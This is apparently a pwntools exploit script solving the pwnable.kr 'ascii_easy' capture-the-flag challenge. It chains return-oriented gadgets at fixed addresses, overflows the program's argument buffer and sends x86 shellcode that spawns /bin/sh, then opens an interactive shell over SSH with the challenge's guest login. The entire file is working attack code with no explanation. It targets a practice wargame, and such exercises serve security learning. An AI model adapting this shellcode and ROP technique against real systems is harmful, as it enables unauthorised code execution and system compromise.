from pwn import *
import time

context.log_level = 'debug'

Gets = 0x555c3e30
mmap_free = 0x557015e8
int_80 = 0x556b5a6d
int_81 = 0x556b5a6d + 0x1
int_82 = 0x556b5a6d + 0x2
target = int_82

shellcode = "a" * 0x1c + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

pop_esp = 0x55667844
mov_ecx_2_pop_ebx = 0x555e5633
pop_ecx = 0x556d2a51
pop_edx_edi = 0x555f3555
xor_eax = 0x55697f3a
write_edx_eax = 0x5555e000 + 0xa845c
mov_eax_edx = 0x5555e000 + 0x148a7f
eax_7 = 0x5555e000 + 0x14707f
eax_3 = 0x5555e000 + 0x148e35
pop_edx_2 = 0x5555e000 + 0x196525
pop_ebp_ebx = 0x5555e000 + 0x145455
xor_ebx_ebp = 0x5555e000 + 0xd564b
pop_ecx = 0x5555e000 + 0x174a4f

payload = 'a' * 32 + p32(pop_edx_edi) + p32(0x55555579) + p32(0x55555555) + p32(mov_eax_edx) + p32(eax_7) + p32(pop_edx_2) + p32(int_81) + p32(write_edx_eax)

payload+= p32(pop_ecx) + p32(target) + p32(pop_ebp_ebx) + p32(0x55555555) + p32(0x55555555) + p32(xor_ebx_ebp) + p32(pop_edx_edi) + p32(0x30303030) + p32(0x55555555) + p32(eax_3) + p32(0x55555555) + p32(int_80) + p32(target)

con = ssh(host='pwnable.kr', port=2222, user='ascii_easy', password='guest')
p = con.process(["/home/ascii_easy/ascii_easy", payload])
time.sleep(1)
p.sendline(shellcode)
p.interactive()
